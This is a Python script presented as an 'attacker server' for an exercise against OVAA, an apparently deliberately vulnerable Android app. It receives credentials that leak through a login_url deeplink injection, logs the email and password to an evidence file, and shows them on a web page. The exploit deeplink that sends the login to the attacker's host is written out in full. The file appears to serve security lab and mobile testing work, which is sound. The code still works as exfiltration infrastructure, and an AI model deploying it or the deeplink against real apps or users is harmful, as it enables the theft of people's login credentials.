#!/usr/bin/env python3
"""
OVAA Attacker Server - Credential Capturer
===========================================
Listens on 0.0.0.0:8080 and captures POST requests
containing stolen credentials from OVAA's login_url injection.

Usage:
    python3 steal_server.py [--port 8080]

The server handles:
    - POST /steal  → Captures credentials (JSON body from Retrofit)
    - GET  /steal  → Status check
    - POST /ping   → Health check
"""

import http.server
import json
import argparse
import sys
import os
from datetime import datetime

# ─── Configuration ─────────────────────────────────────────────
CAPTURED_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence", "captured_credentials.txt")
os.makedirs(os.path.dirname(CAPTURED_FILE), exist_ok=True)

class StealHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that captures POSTed credentials."""

    def do_POST(self):
        """Handle POST requests - capture credential JSON body."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"\n{'='*60}")
        print(f"[!] CREDENTIALS CAPTURED at {timestamp}")
        print(f"    Endpoint: {self.path}")
        print(f"    Source:   {self.client_address[0]}:{self.client_address[1]}")
        print(f"    Raw Body: {body}")

        try:
            data = json.loads(body)
            email = data.get("email", "N/A")
            password = data.get("password", "N/A")
            print(f"    email:    {email}")
            print(f"    password: {password}")

            # Save to evidence file
            with open(CAPTURED_FILE, "a") as f:
                f.write(f"[{timestamp}] {self.client_address[0]}\n")
                f.write(f"  email:    {email}\n")
                f.write(f"  password: {password}\n")
                f.write(f"  raw:      {body}\n\n")
            print(f"    Saved to: {CAPTURED_FILE}")
        except json.JSONDecodeError as e:
            print(f"    [!] JSON parse error: {e}")

        print(f"{'='*60}\n")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def do_GET(self):
        """Handle GET requests."""
        print(f"[*] GET {self.path} from {self.client_address[0]}")

        if self.path == "/view" or self.path == "/":
            # Display captured credentials in web interface
            self._serve_web_view()
        elif self.path == "/steal":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OVAA Steal Server - POST your creds to /steal\n")
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OVAA Steal Server - READY\n")

    def _serve_web_view(self):
        """Render captured credentials as HTML page."""
        captured_html = ""
        if os.path.exists(CAPTURED_FILE):
            with open(CAPTURED_FILE) as f:
                raw = f.read()
            # Escape HTML
            raw = raw.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            for line in raw.strip().split("\n"):
                captured_html += f"<tr><td>{line}</td></tr>\n"

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>OVAA Steal Server - Captured Credentials</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #0f0; margin: 20px; }}
        h1 {{ color: #f00; font-size: 20px; }}
        .creds {{ color: #ff0; font-weight: bold; }}
        table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
        td {{ padding: 8px; border-bottom: 1px solid #333; font-size: 14px; }}
        .blink {{ animation: blink 1s infinite; }}
        @keyframes blink {{ 50%% {{ opacity: 0; }} }}
    </style>
</head>
<body>
    <h1>[!] OVAA Steal Server - Captured Credentials</h1>
    <p>Listening on port {self.server.server_port}</p>
    <p>Deeplink: <span class="creds">oversecured://ovaa/login?url=http://10.0.2.2:{self.server.server_port}/steal</span></p>
    <hr>
    <p class="blink">[!] Menunggu kredensial...</p>
    <table>
        {captured_html if captured_html else '<tr><td>Belum ada kredensial tertangkap.</td></tr>'}
    </table>
    <hr>
    <p><small>Kredensial dikirim via <b>POST /steal</b> oleh OVAA melalui Retrofit</small></p>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def log_message(self, format, *args):
        """Suppress default HTTP logging noise."""
        pass


def main():
    parser = argparse.ArgumentParser(
        description="OVAA Attacker Server - Credential Capturer"
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=8080,
        help="Port to listen on (default: 8080)"
    )
    args = parser.parse_args()

    server_address = ("0.0.0.0", args.port)
    httpd = http.server.HTTPServer(server_address, StealHandler)

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║              OVAA ATTACKER SERVER - READY                   ║
╠══════════════════════════════════════════════════════════════╣
║  Listening on : http://0.0.0.0:{args.port:<5}                       ║
║  Capture endpoint: POST /steal                              ║
║  Status endpoint:  GET  /steal                              ║
║  Evidence file:    {CAPTURED_FILE:<42} ║
╠══════════════════════════════════════════════════════════════╣
║  On emulator, use: http://10.0.2.2:{args.port}/steal               ║
║  Deeplink: oversecured://ovaa/login?url=http://10.0.2.2:{args.port}/steal ║
╠══════════════════════════════════════════════════════════════╣
║  Press Ctrl+C to stop                                      ║
╚══════════════════════════════════════════════════════════════╝
""")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
        httpd.server_close()


if __name__ == "__main__":
    main()
